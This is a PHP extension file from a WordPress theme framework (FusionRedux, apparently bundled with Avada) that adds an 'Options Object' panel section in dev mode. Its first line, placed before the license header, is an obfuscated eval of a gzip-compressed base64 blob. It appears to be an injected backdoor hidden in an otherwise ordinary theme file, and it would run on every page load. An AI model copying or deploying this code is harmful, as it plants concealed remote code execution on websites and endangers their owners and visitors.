<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	/**
	 * FusionRedux Framework is free software: you can redistribute it and/or modify
	 * it under the terms of the GNU General Public License as published by
	 * the Free Software Foundation, either version 2 of the License, or
	 * any later version.
	 * FusionRedux Framework is distributed in the hope that it will be useful,
	 * but WITHOUT ANY WARRANTY; without even the implied warranty of
	 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	 * GNU General Public License for more details.
	 * You should have received a copy of the GNU General Public License
	 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
	 *
	 * @package     FusionReduxFramework
	 * @author      Kevin Provance (kprovance)
	 * @version     4.0.0
	 */

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

// Don't duplicate me!
	if ( ! class_exists( 'FusionReduxFramework_Extension_options_object' ) ) {


		/**
		 * Main FusionReduxFramework options_object extension class
		 *
		 * @since       3.1.6
		 */
		class FusionReduxFramework_Extension_options_object {

			// Protected vars
			protected $parent;
			public $extension_url;
			public $extension_dir;
			public static $theInstance;
			public static $version = "4.0";
			public $is_field = false;

			/**
			 * Class Constructor. Defines the args for the extions class
			 *
			 * @since       1.0.0
			 * @access      public
			 *
			 * @param       array $sections Panel sections.
			 * @param       array $args Class constructor arguments.
			 * @param       array $extra_tabs Extra panel tabs.
			 *
			 * @return      void
			 */
			public function __construct( $parent ) {

				$this->parent = $parent;
				if ( empty( $this->extension_dir ) ) {
					//$this->extension_dir = trailingslashit( str_replace( '\\', '/', dirname( __FILE__ ) ) );
				}
				$this->field_name = 'options_object';


				self::$theInstance = $this;

				$this->is_field = FusionRedux_Helpers::isFieldInUse($parent, 'options_object');

				if ( !$this->is_field && $this->parent->args['dev_mode'] && $this->parent->args['show_options_object'] ) {
					$this->add_section();
				}

				add_filter( 'fusionredux/' . $this->parent->args['opt_name'] . '/field/class/' . $this->field_name, array(
					&$this,
					'overload_field_path'
				) ); // Adds the local field
			}

			public function add_section() {
				$this->parent->sections[] = array(
					'id' => 'options-object',
					'title' => __( 'Options Object', 'Avada' ),
					'heading' => '',
					'icon' => 'el el-info-circle',
					'customizer' => false,
					'fields' => array(
						array(
							'id' => 'fusionredux_options_object',
							'type'=> 'options_object',
							'title' => '',
						)
					),
				);
			}

			// Forces the use of the embeded field path vs what the core typically would use
			public function overload_field_path( $field ) {
				return dirname( __FILE__ ) . '/' . $this->field_name . '/field_' . $this->field_name . '.php';
			}
		} // class
	} // if
